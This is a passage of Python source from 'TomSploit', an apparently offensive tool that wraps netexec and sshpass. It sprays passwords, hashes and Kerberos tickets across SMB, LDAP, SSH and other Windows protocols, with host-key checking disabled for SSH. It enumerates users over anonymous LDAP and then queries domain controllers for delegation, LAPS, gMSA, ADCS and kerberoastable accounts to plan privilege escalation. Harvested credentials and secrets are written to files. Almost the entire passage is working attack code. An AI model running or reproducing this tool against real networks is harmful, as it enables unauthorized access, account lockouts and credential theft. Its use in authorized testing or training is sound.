        "-o", "MACs=+hmac-sha1,hmac-md5",
    ]

    @staticmethod
    def _ssh_cmd(target: str, user: str, legacy: bool = False) -> list[str]:
        """sshpass + ssh, password auth only, non-interactive, runs a marker
        command so success means a real shell executed it. The password comes
        from $SSHPASS (sshpass -e), NOT argv, so it never appears in `ps`.
        legacy=True re-enables the old host-key/KEX/cipher algorithms for
        ancient servers."""
        marker = TomSploit._SSH_MARKER
        ssh = [
            "ssh",
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            "-o", "GlobalKnownHostsFile=/dev/null",
            "-o", "ConnectTimeout=10",
            "-o", "PreferredAuthentications=password,keyboard-interactive",
            "-o", "PubkeyAuthentication=no",
            "-o", "NumberOfPasswordPrompts=1",
            "-o", "LogLevel=ERROR",
        ]
        if legacy:
            ssh.extend(TomSploit._SSH_LEGACY_OPTS)
        ssh.extend([
            f"{user}@{target}",
            # Marker ONLY — deliberately no 'id' and no '2>/dev/null'. The remote
            # shell may be Windows cmd.exe / PowerShell (OpenSSH for Windows),
            # where ';' is not a command separator and a '2>/dev/null' redirect
            # targets the non-existent path \dev\null — cmd then ABORTS the
            # command without running it, so the marker never prints and a VALID
            # login is misreported as "auth failed". A bare 'echo <marker>' runs
            # identically on cmd, PowerShell, sh and bash.
            f"echo {marker}",
        ])
        return ["sshpass", "-e", *ssh]

    @staticmethod
    def _ssh_is_conn_error(text: str) -> bool:
        t = text.lower()
        needles = (
            "connection refused", "connection timed out", "no route to host",
            "network is unreachable", "could not resolve", "name or service",
            "connection closed by", "connection reset", "kex_exchange",
            "no matching", "host key verification failed", "broken pipe",
            "port 22: ", "unable to negotiate",
        )
        return any(n in t for n in needles)

    @staticmethod
    def _ssh_is_negotiation_error(text: str) -> bool:
        """The retriable subset of connection errors: host-key / KEX / cipher
        mismatch. Refused / unreachable / unresolved are NOT retriable."""
        t = text.lower()
        return any(n in t for n in
                   ("no matching", "unable to negotiate", "kex_exchange"))

    @staticmethod
    def _ssh_conn_reason(text: str) -> str:
        t = text.lower()
        if "connection refused" in t:        return "connection refused (port closed?)"
        if "no route to host" in t:          return "no route to host"
        if "network is unreachable" in t:    return "network unreachable"
        if ("could not resolve" in t or "name or service" in t):
            return "could not resolve hostname"
        if "host key verification" in t:     return "host key verification failed"
        if ("no matching" in t or "unable to negotiate" in t
                or "kex_exchange" in t):     return "ssh algorithm negotiation failed"
        if "connection timed out" in t:      return "connection timed out"
        return "connection error"

    # ── Kerberos needs a NAME, not an IP ─
    def _resolve_kerberos_target(self, result: TargetResult) -> None:
        """Kerberos authenticates to a SERVICE PRINCIPAL (cifs/host.domain),
        so nxc must be handed a name it can build an SPN from. Given a bare
        IP, every -k attempt fails with KRB5_CC_NOTFOUND / a principal-unknown
        error that looks like bad credentials but isn't.

        Best-effort: grab nxc's unauthenticated SMB info line, build
        `name.domain` from it, and use that as the nxc target for this host.
        The IP is still what we report and what the suggestions use.

        Falls back to a warning rather than blocking — if the operator has
        already put the FQDN in /etc/hosts and passed it as the target, none
        of this runs."""
        if not self.cfg.kerberos:
            return
        result.nxc_target = result.target
        if not _is_ip_literal(result.target):
            return

        cmd = ["nxc", "smb", result.target, "-u", "", "-p", "",
               "--timeout", str(NETEXEC_TIMEOUT)]
        info = ""
        try:
            stdout, _stderr, timed_out = self._run_proc(cmd, SUBPROCESS_TIMEOUT)
        except InterruptedError:
            return
        if not timed_out:
            for raw in stdout.split("\n"):
                marker, msg = parse_nxc_line(raw.strip())
                if marker == "[*]" and ("name:" in msg or "domain:" in msg):
                    info = msg
                    break

        host = extract_hostname(info)
        domain = extract_domain(info) or self.cfg.domain
        if host and domain and domain.upper() != "WORKGROUP":
            fqdn = f"{host}.{domain}"
            result.nxc_target = fqdn
            self._say(f"  {DIM}🎫 Kerberos: using {fqdn} instead of "
                      f"{result.target} (an SPN needs a name){RESET}")
            self._say(f"  {DIM}   if this fails to resolve:  echo "
                      f"'{result.target} {fqdn} {host}' | sudo tee -a "
                      f"/etc/hosts{RESET}")
        else:
            self._say(f"  {YELLOW}⚠ Kerberos against a bare IP{RESET} "
                      f"{DIM}— an SPN needs a hostname, so these attempts will "
                      f"likely fail. Add the DC's FQDN to /etc/hosts and pass "
                      f"that as -t.{RESET}")

    # ── anonymous SMB probe ─
    def _lockout_precheck(self, result: TargetResult) -> None:
        """Read the password policy over an ANONYMOUS SMB session
        (nxc --pass-pol) BEFORE spraying, so we can warn about account
        lockout. Best-effort: many DCs deny this without a credential, in
        which case the threshold stays unknown. Never blocks the spray."""
        if self.cfg.kerberos:
            return
        target = result.target
        cmd = ["nxc", "smb", target, "-u", "", "-p", "", "--pass-pol",
               "--timeout", str(NETEXEC_TIMEOUT)]
        try:
            stdout, _stderr, timed_out = self._run_proc(cmd, SUBPROCESS_TIMEOUT)
        except InterruptedError:
            return
        result.lockout_checked = True
        if timed_out:
            return
        m = re.search(r"Account Lockout Threshold:\s*(\d+|None)", stdout,
                      re.IGNORECASE)
        if m:
            val = m.group(1).lower()
            result.lockout_threshold = 0 if val == "none" else int(val)
        mw = re.search(r"Reset Account Lockout Counter:\s*([^\r\n]+)", stdout,
                       re.IGNORECASE)
        if mw:
            result.lockout_window = mw.group(1).strip()

    def _scan_anon_smb(self, target: str) -> tuple[list[str], bool]:
        cmd = ["nxc", "smb", target, "-u", "", "-p", "",
               "--timeout", str(NETEXEC_TIMEOUT)]
        try:
            stdout, stderr, timed_out = self._run_proc(cmd, SUBPROCESS_TIMEOUT)
        except InterruptedError:
            return [], False
        if timed_out:
            return ["[!] Anonymous SMB check timed out"], False
        out_lines: list[str] = []
        success = False
        for raw in stdout.split("\n"):
            line = raw.strip()
            if not line:
                continue
            out_lines.append(line)
            marker, msg = parse_nxc_line(line)
            if marker == "[+]":
                if not success:
                    self._say(f"  {YELLOW}{BOLD}⚡ SMB (anon){RESET} "
                              f"{YELLOW}{msg}{RESET}")
                success = True
        out_lines.extend(self._stderr_fallback(stdout, stderr))
        return out_lines, success

    # ── anonymous LDAP probe ─
    def _scan_anon_ldap(self, target: str) -> tuple[list[str], bool, list[dict]]:
        """Anonymous LDAP query to enumerate users and descriptions.
        Returns (raw_lines, success, users_list)."""
        cmd = ["nxc", "ldap", target, "-u", "", "-p", "",
               "--query", "(objectClass=*)", "",
               "--timeout", str(NETEXEC_TIMEOUT)]
        try:
            stdout, stderr, timed_out = self._run_proc(cmd, SUBPROCESS_TIMEOUT * 2)
        except InterruptedError:
            return [], False, []
        if timed_out:
            return ["[!] Anonymous LDAP check timed out"], False, []

        out_lines: list[str] = []
        success = False
        users: list[dict] = []
        current_user: dict = {}

        for raw in stdout.split("\n"):
            line = raw.strip()
            if not line:
                continue
            out_lines.append(line)
            marker, _ = parse_nxc_line(line)
            # The (objectClass=*) query prints many [+] lines; only announce
            # the successful bind once (this was a source of duplicate output).
            if marker == "[+]":
                if not success:
                    self._say(f"  {YELLOW}{BOLD}⚡ LDAP (anon){RESET} "
                              f"{YELLOW}anonymous bind successful{RESET}")
                success = True

            # Anchored on the attribute name - nxc's line prefix can itself
            # contain a colon (IPv6 target), and split(':', 1) then grabs the
            # wrong half and invents a username out of the prefix.
            sam = extract_ldap_attr(line, "sAMAccountName")
            if sam is not None:
                if current_user.get("user"):
                    users.append(current_user)
                # Skip computer accounts (trailing $).
                current_user = ({"user": sam, "description": ""}
                                if sam and not sam.endswith("$") else {})
                continue
            desc = extract_ldap_attr(line, "description")
            if desc is not None and current_user.get("user"):
                current_user["description"] = desc

        if current_user.get("user"):
            users.append(current_user)

        out_lines.extend(self._stderr_fallback(stdout, stderr))
        if success and users:
            self._say(f"  {YELLOW}{BOLD}⚡ LDAP (anon){RESET} {YELLOW}"
                      f"found {len(users)} user(s) via anonymous bind{RESET}")
        return out_lines, success, users

    # ── probe + scan phases for one target ─
    def _probe(self, target: str) -> tuple[list[str], list[str]]:
        if self.cfg.no_port_probe:
            open_protos = list(self.cfg.protocols)
        else:
            open_protos = probe_protocols(target, self.cfg.protocols)
        closed = [p for p in self.cfg.protocols if p not in open_protos]
        return open_protos, closed

    # Preference order for the host's identity line. SMB's [*] carries
    # name:/domain:/signing:; LDAP's carries name:/domain:. FTP and SSH
    # banners carry none of it - and as_completed() hands futures back in
    # whatever order they finish, so without this the same host could report
    # a domain on one run and nothing on the next.
    _INFO_PREFERENCE = ("smb-domain", "smb-local", "ldap-domain", "ldap-local",
                        "wmi-domain", "winrm-domain", "rdp-domain",
                        "mssql-domain")

    def _select_target_info(self, result: TargetResult) -> str:
        best = ""
        for key in self._INFO_PREFERENCE:
            for marker, msg in result.protocol_lines.get(key, []):
                if marker != "[*]":
                    continue
                if "name:" in msg or "domain:" in msg:
                    return msg
                if not best:
                    best = msg
        if best:
            return best
        for _key, plines in result.protocol_lines.items():
            for marker, msg in plines:
                if marker == "[*]":
                    return msg
        return result.target_info

    def _scan_target(self, result: TargetResult) -> None:
        """Run all protocol + anonymous scans for an already-probed target,
        filling `result` in place."""
        open_protos = result.open_protocols
        target = result.nxc_target or result.target

        # Build the flat attempt list: one nxc spawn per
        # (protocol, scope, credential). Credentials a protocol simply can't
        # use are filtered out HERE rather than skipped at run time, so the
        # progress total reflects work that will actually happen.
        attempts: list[tuple[str, bool, Cred]] = []
        ssh_scheduled = False
        states: dict[str, _ProtoState] = {}
        for proto in open_protos:
            scopes = [False]
            if proto in LOCAL_AUTH_PROTOCOLS and not self.cfg.kerberos:
                scopes.append(True)
            for scope in scopes:
                key = f"{proto}-{'local' if scope else 'domain'}"
                states.setdefault(key, _ProtoState())
                if proto == "ssh":
                    # SSH is handled with the REAL ssh client, not nxc's
                    # module — nxc's paramiko handler can disagree with
                    # OpenSSH on servers with non-standard auth.
                    ssh_scheduled = True
                    continue
                for cred in self.creds:
                    if (cred.is_hash or cred.is_kerberos) and proto not in WINDOWS_PROTOS:
                        continue
                    attempts.append((proto, scope, cred))

        with self._progress_lock:
            self._done = 0
            # _scan_attempt ticks once; _scan_ssh ticks once per credential.
            self._total = len(attempts) + (len(self.creds) if ssh_scheduled else 0)
            self._redraw()

        start = time.time()
        anon_lines: list[str] = []
        anon_success = False
        seen_target_keys: set[tuple] = set()

        with ThreadPoolExecutor(max_workers=max(2, self.cfg.workers)) as pool:
            anon_future = (pool.submit(self._scan_anon_smb, target)
                           if "smb" in open_protos and not self.cfg.kerberos
                           else None)
            anon_ldap_future = (pool.submit(self._scan_anon_ldap, target)
                                if "ldap" in open_protos and not self.cfg.kerberos
                                else None)

            # Ordered list, not a dict + as_completed: results are collected
            # in submission order so a protocol block reads the same way on
            # every run. Wall time is identical — we need every result before
            # anything renders — and live ⚡ hit lines still print the moment
            # they land, from the worker.
            futures: list[tuple[str, object]] = []
            if ssh_scheduled:
                futures.append(("ssh-domain",
                                pool.submit(self._scan_ssh_task, target)))
            for proto, scope, cred in attempts:
                key = f"{proto}-{'local' if scope else 'domain'}"
                futures.append((key, pool.submit(
                    self._scan_attempt, proto, target, cred, scope, states[key])))

            for fallback_key, fut in futures:
                if self._stop.is_set():
                    break
                try:
                    key, lines, successes = fut.result()
                except Exception as exc:
                    key = fallback_key
                    lines, successes = [("[!]", f"Task error: {exc}")], []
                    if self.cfg.debug:
                        import traceback; traceback.print_exc()
                # extend, not assign: many attempts now feed the same key.
                result.protocol_lines.setdefault(key, []).extend(lines)
                if not result.target_info:
                    for marker, msg in lines:
                        if marker == "[*]":
                            result.target_info = msg
                            break
                # Dedup at the target level — the same credential succeeding
                # on the same protocol is one finding, however many nxc
                # invocations reported it.
                for s in successes:
                    if s.dedup_key in seen_target_keys:
                        continue
                    seen_target_keys.add(s.dedup_key)
                    (result.guests if s.is_guest else result.successes).append(s)

            if anon_future is not None:
                try:
                    anon_lines, anon_success = anon_future.result()
                except Exception as exc:
                    anon_lines = [f"[!] Anonymous SMB error: {exc}"]

            if anon_ldap_future is not None:
                try:
                    ldap_lines, ldap_ok, ldap_users = anon_ldap_future.result()
                except Exception as exc:
                    ldap_lines, ldap_ok, ldap_users = \
                        [f"[!] Anonymous LDAP error: {exc}"], False, []
                result.anon_ldap_lines = ldap_lines
                result.anon_ldap = ldap_ok
                result.anon_ldap_users = ldap_users

        result.anon_smb_lines = anon_lines
        result.anon_smb = anon_success

        # Pick the identity line deterministically rather than keeping
        # whichever protocol's future happened to land first.
        result.target_info = self._select_target_info(result)

        # Derive hostname / domain / DC / real IP from the gathered output.
        result.hostname = extract_hostname(result.target_info)
        result.domain = extract_domain(result.target_info)
        if not result.domain and self.cfg.domain:
            # operator-supplied -d, used when nxc's own output named no domain
            result.domain = self.cfg.domain

        # DC detection signals (see detect_dc):
        #  - LDAP port open (member servers don't answer LDAP)
        #  - an LDAP [*] info line came back (LDAP actually responded)
        #  - any nxc line explicitly naming the DC role
        # Only a REAL probe result counts as evidence. Under --no-port-probe
        # open_protocols is just the requested list, so "ldap is open" was
        # true for every host; combined with an operator-supplied -d (which
        # satisfies the domain half of the test) that flagged every single
        # target as a DC, handed it the DC-only suggestion set, and printed a
        # bogus Domain Controllers section. Fall back to actual LDAP output.
        ldap_open = result.probed and "ldap" in result.open_protocols
        ldap_info = ""
        role_flag = False
        for key, plines in result.protocol_lines.items():
            for marker, msg in plines:
                if line_flags_dc_role(msg):
                    role_flag = True
                if key.startswith("ldap-") and marker == "[*]" and not ldap_info:
                    ldap_info = msg
        # The anonymous LDAP probe answering is itself evidence LDAP is live —
        # but only if it actually answered. A non-empty anon_ldap_lines used
        # to be enough, and that list is non-empty even when it holds nothing
        # but "[!] Anonymous LDAP check timed out".
        if result.anon_ldap or any(
                parse_nxc_line(l)[0] in ("[*]", "[+]")
                for l in result.anon_ldap_lines):
            ldap_open = True
        result.is_dc = detect_dc(result.target_info, ldap_open,
                                 ldap_info, role_flag, self.cfg.domain)

        # SMB signing — only the SMB [*] info line carries it. Check the SMB
        # protocol lines and the anonymous-SMB probe output.
        for key, plines in result.protocol_lines.items():
            if not key.startswith("smb-"):
                continue
            for marker, msg in plines:
                sig = extract_smb_signing(msg)
                if sig is not None:
                    result.smb_signing = sig
                    break
            if result.smb_signing is not None:
                break
        if result.smb_signing is None:
            for line in result.anon_smb_lines:
                sig = extract_smb_signing(line)
                if sig is not None:
                    result.smb_signing = sig
                    break

        for _, plines in result.protocol_lines.items():
            for _, msg in plines:
                ip = extract_ipv4(msg)
                if ip:
                    result.real_ip = ip; break
            if result.real_ip:
                break
        if not result.real_ip:
            for line in anon_lines:
                ip = extract_ipv4(line)
                if ip:
                    result.real_ip = ip; break
        result.real_ip = result.real_ip or target

        # Enrichment runs LAST: it needs is_dc and the successes list, and it
        # sits outside the progress bar because _total was fixed up front.
        try:
            self._enrich_dc(result)
        except InterruptedError:
            pass
        except Exception as exc:
            if self.cfg.debug:
                import traceback; traceback.print_exc()
            result.enrich_notes = [f"enrichment failed: {exc}"]

        result.elapsed = time.time() - start
        self._clear_progress()

    # ── post-scan LDAP enrichment (DC only) ─
    #
    # Turns always-on suggestion blocks into ones gated on what the domain
    # actually has. Four read-only LDAP queries against a DC we already hold a
    # working credential for, run in parallel, outside the progress accounting
    # (the bar's total was fixed before the scan started and must not drift).
    #
    # Cost is 4 nxc spawns per DC, ~2-3s wall clock parallelised. Skipped
    # entirely with --no-enrich, and never attempted without an LDAP success.
    #
    # Everything here is ENUMERATION: --find-delegation, -M laps, --gmsa and
    # -M adcs all read the directory. Nothing is modified, nothing is
    # exploited — same posture as the rest of tomsploit.

    _ENRICH_TIMEOUT = 45.0

    def _enrich_cred(self, result: TargetResult) -> "Success | None":
        """Pick the credential to enrich with: a domain-scope LDAP success,
        preferring an admin one. Local-auth creds are useless against LDAP."""
        cands = [s for s in result.successes
                 if s.protocol == "ldap" and not s.local_auth and not s.is_guest]
        if not cands:
            return None
        cands.sort(key=lambda s: (not s.is_admin,))
        return cands[0]

    def _enrich_nxc(self, target: str, cred: "Success",
                    extra: list[str]) -> str:
        """One read-only nxc ldap invocation for enrichment. Returns stdout
        ('' on failure/timeout) — callers treat empty as 'found nothing'."""
        cmd = ["nxc", "ldap", target, "-u", cred.user]
        if cred.is_kerberos:
            cmd.append("--use-kcache")
        elif cred.is_hash:
            cmd.extend(["-H", cred.secret])
        else:
            cmd.extend(["-p", cred.secret])
        if self.cfg.domain:
            cmd.extend(["-d", self.cfg.domain])
        cmd.extend(extra)
        cmd.extend(["--timeout", str(NETEXEC_TIMEOUT)])
        try:
            out, err, timed_out = self._run_proc(cmd, self._ENRICH_TIMEOUT)
        except InterruptedError:
            return ""
        return "" if timed_out else (out or "")

    @staticmethod
    def _enrich_highlights(out: str, drop_prefixes: tuple[str, ...] = ()
                           ) -> list[str]:
        """nxc 'highlight' lines carry the actual findings and have NO marker
        ([+]/[*]/[-]), so they can't be picked out with parse_nxc_line. Take
        lines with the LDAP banner but no marker, strip the banner, and drop
        nxc's own failure text ('No result found...', 'No ADCS infrastructure
        found.') which is printed via logger.fail -> a [-] marker anyway."""
        hits: list[str] = []
        for raw in out.split("\n"):
            line = _ANSI_RE.sub("", raw).rstrip()
            if not line.strip():
                continue
            marker, _msg = parse_nxc_line(line)
            if marker is not None:
                continue                      # [+]/[*]/[-]/[!] = status, not a finding
            body = _DELEG_PREFIX_RE.sub("", line).strip()
            if not body:
                continue
            low = body.lower()
            if low.startswith(("no result found", "no entries found",
                               "no adcs infrastructure")):
                continue
            if drop_prefixes and body.startswith(drop_prefixes):
                continue
            hits.append(body)
        return hits

    def _enrich_dc(self, result: TargetResult) -> None:
        """Run the four enrichment queries and record what came back."""
        if self.cfg.no_enrich or not result.is_dc or self._stop.is_set():
            return
        cred = self._enrich_cred(result)
        if cred is None:
            return
        target = result.nxc_target or result.target

        jobs = {
            "deleg": ["--find-delegation"],
            "laps":  ["-M", "laps"],
            "gmsa":  ["--gmsa"],
            "adcs":  ["-M", "adcs"],
            # ms-DS-MachineAccountQuota: decides whether RBCD "add a computer"
            # and the self-RBCD path are even available (0 = dead).
            "maq":   ["-M", "maq"],
            # domain-wide roastable-account list. NOT --kerberoasting: that
            # requests a TGS for every SPN account (hundreds of round-trips),
            # which times out through a pivot and is noisy. One LDAP query for
            # SPN-bearing user accounts gives the same list, fast and quiet.
            "roast": ["--query",
                      "(&(servicePrincipalName=*)(!(objectClass=computer)))",
                      "sAMAccountName"],
        }
        outs: dict[str, str] = {}
        # Enrichment phase: the parallel jobs, plus roastability + daclread
        # after. Shows a labelled spinner so the bar never sits hung at 100%.
        self._enter_enrich_phase(len(jobs) + 2, "delegation, LAPS, gMSA, ADCS")
        try:
            with ThreadPoolExecutor(max_workers=4) as pool:
                futs = {k: pool.submit(self._enrich_nxc, target, cred, v)
                        for k, v in jobs.items()}
                for k, f in futs.items():
                    try:
                        outs[k] = f.result()
                    except Exception:
                        outs[k] = ""
                    self._enrich_step()

            result.deleg_rows = parse_delegation_output(outs.get("deleg", ""))
            # Resolve the HOW: for exactly the delegation accounts, is each one
            # kerberoastable / AS-REP-roastable right now? One targeted query,
            # so the file can state a fact and emit the command instead of
            # printing "kerberoast it if it holds an SPN".
            self._enrich_step("resolving roastability")
            if result.deleg_rows:
                try:
                    self._enrich_roastability(target, cred, result.deleg_rows)
                except Exception:
                    pass      # leaves roast_checked False -> emitters fall back
            # 'Getting GMSA Passwords' is nxc's display() banner, not a find.
            result.laps_hits = self._enrich_highlights(outs.get("laps", ""))
            result.gmsa_hits = self._enrich_highlights(
                outs.get("gmsa", ""), drop_prefixes=("Getting GMSA",))
            result.adcs_hits = self._enrich_highlights(outs.get("adcs", ""))
            result.maq = _parse_maq(outs.get("maq", ""))
            result.roastable_sweep = _parse_roast_sweep(outs.get("roast", ""))
            # Per-account DIRECT-ACE write check (daclread). Only for accounts
            # a write would help: user delegating accounts (plant an SPN) and
            # RBCD victims. Group-inherited rights are invisible to daclread —
            # BloodHound (already suggested) covers those.
            self._enrich_step("checking write ACLs")
            if result.deleg_rows:
                try:
                    self._enrich_dacls(target, cred, result.deleg_rows)
                except Exception:
                    pass
            result.enriched = True
        finally:
            self._exit_enrich_phase()

        bits = []
        if result.deleg_rows:
            kinds: dict[str, int] = {}
            for r in result.deleg_rows:
                kinds[r.kind.value] = kinds.get(r.kind.value, 0) + 1
            bits.append("delegation: " + ", ".join(f"{v}x {k}"
                                                   for k, v in sorted(kinds.items())))
        if result.laps_hits:
            bits.append(f"LAPS: {len(result.laps_hits)} readable")
        if result.gmsa_hits:
            bits.append(f"gMSA: {len(result.gmsa_hits)}")
        if result.adcs_hits:
            bits.append(f"ADCS: {len(result.adcs_hits)} object(s)")
        if result.maq is not None:
            bits.append(f"MAQ: {result.maq}")
        if result.roastable_sweep:
            bits.append(f"roastable: {len(result.roastable_sweep)} SPN account(s)")
        result.enrich_notes = bits
        if bits:
            self._say(f"  {CYAN}{BOLD}⊕ enrich{RESET} {CYAN}"
                      f"{'; '.join(bits)}{RESET}")

    def _enrich_roastability(self, target: str, cred: "Success",
                             rows: list) -> None:
        """One LDAP query over exactly the delegation accounts, pulling
        servicePrincipalName + userAccountControl, to decide how to get INTO
        each. Anchoring on these accounts (not a domain-wide roast) keeps it a
        single cheap query and avoids dumping every SPN in the domain."""
        names = [r.account for r in rows if r.account and "<" not in r.account]
        if not names:
            return
        # Build an OR filter over the sAMAccountNames. Escape per RFC 4515.
        def esc(v: str) -> str:
            return (v.replace("\\", "\\5c").replace("(", "\\28")
                     .replace(")", "\\29").replace("*", "\\2a")
                     .replace("\x00", "\\00"))
        ors = "".join(f"(sAMAccountName={esc(n)})" for n in names)
        filt = f"(|{ors})" if len(names) > 1 else ors
        out = self._enrich_nxc(target, cred,
                               ["--query", filt,
                                "sAMAccountName servicePrincipalName "
                                "userAccountControl msDS-AllowedToDelegateTo"])
        if not out:
            return
        info = _parse_roast_query(out)
        if not info:
            return          # query ran but nothing parsed — leave all unchecked
        for r in rows:
            rec = info.get(r.account.lower())
            if rec is None:
                # This account was NOT in the parsed result. Do NOT mark it
                # checked: a missing match must fall back to the honest
                # "kerberoast if it has an SPN" conditional, never masquerade
                # as a definitive "not roastable" (which is what a checked row
                # with no SPN/preauth becomes).
                continue
            r.roast_checked = True
            r.own_spn = rec.get("spn", "")
            r.uac = rec.get("uac", 0)
            r.allowed_to = rec.get("allowed_to", [])

    def _enrich_dacls(self, target: str, cred: "Success", rows: list) -> None:
        """Per-account DIRECT-ACE write check. Runs nxc daclread against each
        account a write would help — a USER delegating account (plant an SPN)
        or an RBCD victim — and records the trustees holding a direct write.

        Deliberately targeted, not a sweep: daclread reads ONE object per call
        and cannot see group-inherited rights, so a domain-wide run would be
        both slow and misleading. One call per relevant account, and the output
        is always framed as 'direct ACEs only — BloodHound for group rights'."""
        # Which accounts is a write actually useful against?
        def wants_write(r) -> bool:
            if "<" in r.account:
                return False
            if r.kind == DelegKind.RBCD:
                return True                    # victim: write = set up the edge
            if r.kind == DelegKind.UNCONSTRAINED and not r.is_computer:
                return True                    # user: write = plant an SPN
            return False

        for r in rows:
            if not wants_write(r) or self._stop.is_set():
                continue
            targets = r.rights_to if r.kind == DelegKind.RBCD else [r.account]
            found: list[str] = []
            for tgt in targets:
                sam = tgt.strip()
                if not sam or "<" in sam:
                    continue
                out = self._enrich_nxc(target, cred,
                                       ["-M", "daclread",
                                        "-o", f"TARGET={sam}", "ACTION=read"])
                if out:
                    found.extend(_parse_dacl_writers(out))
            # dedupe, drop the account itself (self-ACE is not useful)
            seen = set()
            r.direct_writers = [w for w in found
                                if not (w.lower() in seen or seen.add(w.lower()))]

    # ── full scan ─
    def run(self) -> int:
        self._init_log()
        self._guard(self.reporter.banner)
        results: list[TargetResult] = []
        try:
            for target in self.cfg.targets:
                if self._stop.is_set():
                    break
                try:
                    self._guard(self.reporter.target_header, target)
                    open_protos, closed = self._probe(target)
                    result = TargetResult(target=target,
                                          nxc_target=target,
                                          probed=not self.cfg.no_port_probe,
                                          open_protocols=open_protos,
                                          closed_protocols=closed)
                    if not open_protos:
                        result.scanned = False
                        result.skipped_reason = "no open ports"
                        results.append(result)
                        self._guard(self.reporter.no_open_ports)
                        self._persist(results)
                        continue

                    self._guard(self.reporter.port_probe, result)
                    # Must run BEFORE the spray: it decides what name every
                    # subsequent nxc invocation is given.
                    self._resolve_kerberos_target(result)
                    if "smb" in result.open_protocols:
                        self._lockout_precheck(result)
                    self._guard(self.reporter.lockout_warning, result)

                    self._scan_target(result)

                    # Bank the findings BEFORE anything renders them. This
                    # append used to sit after the reporter calls, so a display
                    # bug in protocol_results/valid_section discarded the whole
                    # TargetResult — the credentials this target actually found
                    # never reached the summary, the JSON, or the creds file.
                    results.append(result)
                    if self.cfg.creds_file and result.successes:
                        try:
                            append_creds(self.cfg.creds_file, result)
                        except OSError as exc:
                            print(f"  {YELLOW}[!] Could not write creds file: "
                                  f"{exc}{RESET}")
                    self._persist(results)

                    self._guard(self.reporter.protocol_results, result)
                    self._guard(self.reporter.valid_section, result)
                except KeyboardInterrupt:
                    raise
                except Exception as exc:
                    self._clear_progress()
                    print(f"\n  {RED}{BOLD}✗ Error on {target}:{RESET} "
                          f"{exc.__class__.__name__}: {exc}")
                    if self.cfg.debug:
                        import traceback; traceback.print_exc()
                    else:
                        print(f"  {DIM}Re-run with --debug for traceback.{RESET}")
                    failed = TargetResult(target=target, scanned=False,
                                          skipped_reason=f"error: {exc.__class__.__name__}")
                    results.append(failed)
        finally:
            # Order matters: persist BEFORE rendering. Writing the artifacts
            # first means a crash in summary/next_steps can no longer take the
            # JSON and log down with it.
            if self.cfg.json_out:
                self._guard(self._write_json, results)
            self._guard(self._write_log, results)
            if not self._stop.is_set():
                self._guard(self.reporter.summary, results)
                self._guard(self.reporter.next_steps, results)
        return 130 if self._stop.is_set() else 0

    def _init_log(self) -> None:
        """Write the log header once, up front. Raw command output is then
        appended by _log() as each command completes, so the file on disk is
        always current — a kill at any point leaves everything gathered so
        far, rather than an empty file."""
        if not self.cfg.log_file:
            return
        try:
            with self._log_lock, open(self.cfg.log_file, "w") as f:
                f.write(f"tomsploit — "
                        f"{datetime.now().isoformat(timespec='seconds')}\n")
                f.write(f"targets:   {', '.join(self.cfg.targets)}\n")
                f.write(f"protocols: {', '.join(self.cfg.protocols)}\n")
                f.write(f"\n{'=' * 60}\n  RAW COMMAND OUTPUT\n{'=' * 60}\n\n")
        except OSError as exc:
            print(f"  {YELLOW}[!] Could not open log file: {exc}{RESET}")

    def _guard(self, fn, *args) -> None:
        """Run a display function so a rendering failure can never cost you
        data. Everything the reporter does is cosmetic; nothing it raises
        should abort a scan or discard a result."""
        try:
            fn(*args)
        except KeyboardInterrupt:
            raise
        except Exception as exc:
            self._clear_progress()
            print(f"  {YELLOW}[!] display error in {getattr(fn, '__name__', fn)}: "
                  f"{exc.__class__.__name__}: {exc}{RESET}")
            if self.cfg.debug:
                import traceback; traceback.print_exc()

    def _persist(self, results: list[TargetResult]) -> None:
        """Flush structured output after every target rather than only at the
        end. A hard kill — OOM, closed terminal, exam VM reset — used to lose
        the entire JSON and log; now it loses at most the target in flight.

        Guarded: a mid-run persistence failure must never surface as a scan
        error for the host in flight. _write_json already writes atomically
        and catches its own OSError, but this is belt-and-braces so nothing
        here can ever propagate into the per-target except."""
        if not self.cfg.json_out:
            return
        try:
            self._write_json(results)
        except Exception:
            pass

    def _write_json(self, results: list[TargetResult]) -> None:
        def ser_succ(s: Success) -> dict:
            return {
                "protocol": s.protocol, "scope": s.scope,
                "domain": s.domain, "user": s.user, "secret": s.secret,
                "auth_type": s.auth_type.value,
                "is_admin": s.is_admin, "is_guest": s.is_guest,
                "raw_message": s.raw_message,
            }
        payload = {
            "scan_time": datetime.now().isoformat(timespec="seconds"),
            "log_file": self.cfg.log_file,
            "creds_file": self.cfg.creds_file,
            "kerberos": self.cfg.kerberos,
            "protocols": self.cfg.protocols,
            "targets": [
                {
                    "target": r.target, "real_ip": r.real_ip,
                    "hostname": r.hostname, "domain": r.domain,
                    "is_dc": r.is_dc, "scanned": r.scanned,
                    "smb_signing": r.smb_signing,
                    "skipped_reason": r.skipped_reason or None,
                    "elapsed_seconds": round(r.elapsed, 2),
                    "open_protocols": r.open_protocols,
                    "closed_protocols": r.closed_protocols,
                    "anon_smb": r.anon_smb, "anon_ldap": r.anon_ldap,
                    "anon_ldap_users": r.anon_ldap_users,
                    "successes": [ser_succ(s) for s in r.successes],
                    "guests": [ser_succ(s) for s in r.guests],
                }
                for r in results
            ],
        }
        try:
            # default=str: never let one odd value in a parsed nxc line turn
            # into a TypeError that discards the whole file. A stringified
            # oddity is infinitely better than no results.
            tmp = self.cfg.json_out + ".tmp"
            with open(tmp, "w") as f:
                json.dump(payload, f, indent=2, default=str)
            # atomic replace: a kill mid-write can't leave truncated JSON
            os.replace(tmp, self.cfg.json_out)
        except Exception as exc:
            print(f"  {YELLOW}[!] Could not write JSON: "
                  f"{exc.__class__.__name__}: {exc}{RESET}")

    def _write_log(self, results: list[TargetResult]) -> None:
        """Write the consolidated scan log (replaces nxc's per-call --log):
        the raw output of every command, then a short per-target summary.
        Only writes when -o/--output gave a path; otherwise nothing is left
        on disk (nxc still keeps its own logs under ~/.nxc/logs)."""
        if not self.cfg.log_file:
            return
        try:
            with self._log_lock, open(self.cfg.log_file, "a") as f:
                f.write(f"\n{'=' * 60}\n  RESULT SUMMARY\n{'=' * 60}\n")
                for r in results:
                    head = r.target
                    if r.hostname or r.domain:
                        head += (f"  (host:{r.hostname or '?'} "
                                 f"domain:{r.domain or '?'})")
                    f.write(f"\n{head}\n")
                    if not r.scanned:
                        f.write(f"  skipped: {r.skipped_reason}\n")
                        continue
                    if r.successes:
                        for s in r.successes:
                            adm = " (admin)" if s.is_admin else ""
                            f.write(f"  [+] {s.protocol} {s.scope}  "
